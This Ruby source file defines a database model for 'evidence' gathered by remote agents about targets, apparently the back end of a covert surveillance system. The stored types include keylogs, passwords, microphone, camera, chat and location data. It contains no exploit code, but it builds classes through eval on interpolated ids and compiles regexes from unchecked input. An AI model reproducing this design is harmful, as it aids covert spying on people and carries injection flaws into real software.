require 'mongoid'
require_relative '../shard'

#module RCS
#module DB

class Evidence
  extend RCS::Tracer

  TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
           "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]

  def self.collection_name(target)
    "evidence.#{target}"
  end

  def self.collection_class(target)

    classDefinition = <<-END
      class Evidence_#{target}
        include Mongoid::Document

        field :da, type: Integer            # date acquired
        field :dr, type: Integer            # date received
        field :type, type: String
        field :rel, type: Integer           # relevance (tag)
        field :blo, type: Boolean           # blotter (report)
        field :note, type: String
        field :aid, type: String            # agent BSON_ID
        field :data, type: Hash
        field :kw, type: Array, default: [] # keywords for full text search

        store_in Evidence.collection_name('#{target}')

        after_create :create_callback
        before_destroy :destroy_callback

        index :type, background: true
        index :da, background: true
        index :dr, background: true
        index :aid, background: true
        index :rel, background: true
        index :blo, background: true
        index :kw, background: true
        shard_key :type, :da, :aid

        STAT_EXCLUSION = ['filesystem', 'info', 'command', 'ip']

        protected

        def create_callback
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.aid
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] += 1
          agent.stat.dashboard ||= {}
          agent.stat.dashboard[self.type] ||= 0
          agent.stat.dashboard[self.type] += 1
          agent.stat.size += self.data.to_s.length
          agent.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
          # update the target of this agent
          agent.get_parent.restat
        end

        def destroy_callback
          agent = Item.find self.aid
          # drop the file (if any) in grid
          unless self.data['_grid'].nil?
            RCS::DB::GridFS.delete(self.data['_grid'], agent.path.last.to_s) rescue nil
          end
        end
      end
    END
    
    classname = "Evidence_#{target}"
    
    if self.const_defined? classname.to_sym
      klass = eval classname
    else
      eval classDefinition
      klass = eval classname
    end
    
    return klass
  end

  def self.dynamic_new(target_id)
    klass = self.collection_class(target_id)
    return klass.new
  end

  def self.deep_copy(src, dst)
    dst.da = src.da
    dst.dr = src.dr
    dst.aid = src.aid.dup
    dst.type = src.type.dup
    dst.rel = src.rel
    dst.blo = src.blo
    dst.data = src.data.dup
    dst.note = src.note.dup unless src.note.nil?
  end

  def self.filter(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info', 'command', 'ip'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    query = filtering.where(filter_hash).order_by([[:da, :asc]])

    return query
  end

  def self.filtered_count(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info', 'command', 'ip'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    num_evidence = filtering.where(filter_hash).count

    return num_evidence
  end

  def self.common_filter(params)

    # filtering
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter' and params['filter'].is_a? String
    # must duplicate here since we delete the param later but we need to keep the parameter intact for
    # subsequent calls
    filter = params['filter'].dup if params.has_key? 'filter' and params['filter'].is_a? Hash

    # if not specified the filter on the date is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil? or filter['from'] == '24h'
    filter['from'] = Time.now.to_i - 7*86400 if filter['from'] == 'week'
    filter['from'] = Time.now.to_i - 30*86400 if filter['from'] == 'month'
    filter['from'] = Time.now.to_i if filter['from'] == 'now'

    filter['to'] = Time.now.to_i if filter['to'].nil?

    # to remove a filter set it to 0
    filter.delete('from') if filter['from'] == 0
    filter.delete('to') if filter['to'] == 0

    filter_hash = {}

    # filter by target
    target = Item.where({_id: filter.delete('target')}).first
    return nil if target.nil?

    # filter by agent
    filter_hash[:aid] = filter.delete('agent') if filter['agent']

    # default filter is on acquired
    date = filter.delete('date')
    date ||= 'da'
    date = date.to_sym

    # date filters must be treated separately
    filter_hash[date.gte] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date.lte] = filter.delete('to') if filter.has_key? 'to'

    # custom filters for info
    if filter.has_key? 'info'
      begin
        key_values = filter.delete('info').split(',')
        key_values.each do |kv|
          k, v = kv.split(':')
          k.downcase!
          filter_hash["data.#{k}"] = Regexp.new("#{v}", true)
        end
      rescue Exception => e
        trace :error, "Invalid filter for data [#{e.message}], ignoring..."
      end
    end

    #filter on note
    filter_hash[:note] = Regexp.new("#{filter.delete('note')}", true) if filter['note']

    return filter, filter_hash, target
  end

  def self.common_mongo_filter(params)
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter'

    # target id
    target_id = filter.delete('target')

    # default date filtering is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil?
    filter['to'] = Time.now.to_i if filter['to'].nil?

    filter_hash = {}

    # agent filter
    filter_hash["aid"] = filter.delete('agent') if filter['agent']

    # date filter
    date = filter.delete('date')
    date ||= 'da'

    # do not account for filesystem and info evidences
    filter_hash["type"] = {"$nin" => ['filesystem', 'info', 'command', 'ip']} unless filter['type']

    filter_hash[date] = Hash.new
    filter_hash[date]["$gte"] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date]["$lte"] = filter.delete('to') if filter.has_key? 'to'

    if filter.has_key? 'info'
      begin
        key_values = filter.delete('info').split(',')
        key_values.each do |kv|
          k, v = kv.split(':')
          filter_hash["data.#{k}"] = Regexp.new("#{v}", true)
        end
      rescue Exception => e
        trace :error, "Invalid filter for data [#{e.message}], ignoring..."
      end
    end

    # remaining filters
    filter.each_key do |k|
      filter_hash[k] = {"$in" => filter[k]}
    end

    return filter, filter_hash, target_id
  end


  def self.offload_move_evidence(params)
    old_target = ::Item.find(params[:old_target_id])
    target = ::Item.find(params[:target_id])
    agent = ::Item.find(params[:agent_id])

    evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id])

    total = evidences.count
    chunk_size = 500
    trace :info, "Evidence Move: #{total} to be moved for agent #{agent.name} to target #{target.name}"

    # move the evidence in chunks to prevent cursor expiration on mongodb
    until evidences.count == 0 do

      evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id]).limit(chunk_size)

      # copy the new evidence
      evidences.each do |old_ev|
        # deep copy the evidence from one collection to the other
        new_ev = Evidence.dynamic_new(target[:_id])
        Evidence.deep_copy(old_ev, new_ev)

        # move the binary content
        if old_ev.data['_grid']
          begin
            bin = RCS::DB::GridFS.get(old_ev.data['_grid'], old_target[:_id].to_s)
            new_ev.data['_grid'] = RCS::DB::GridFS.put(bin, {filename: agent[:_id].to_s}, target[:_id].to_s) unless bin.nil?
            new_ev.data['_grid_size'] = old_ev.data['_grid_size']
          rescue Exception => e
            trace :error, "Cannot get id #{old_target[:_id].to_s}:#{old_ev.data['_grid']} from grid: #{e.class} #{e.message}"
          end
        end

        # save the new one
        new_ev.save

        # delete the old one. NOTE CAREFULLY:
        # we use delete + explicit grid, since the callback in the destroy will fail
        # because the parent of aid in the evidence is already the new one
        old_ev.delete
        RCS::DB::GridFS.delete(old_ev.data['_grid'], old_target[:_id].to_s) unless old_ev.data['_grid'].nil?

        # yield for progress indication
        yield if block_given?
      end

      total = total - chunk_size
      trace :info, "Evidence Move: #{total} left to move for agent #{agent.name} to target #{target.name}" unless total < 0
    end

    trace :info, "Evidence Move: completed for #{agent.name}"
  end

end

#end # ::DB
#end # ::RCS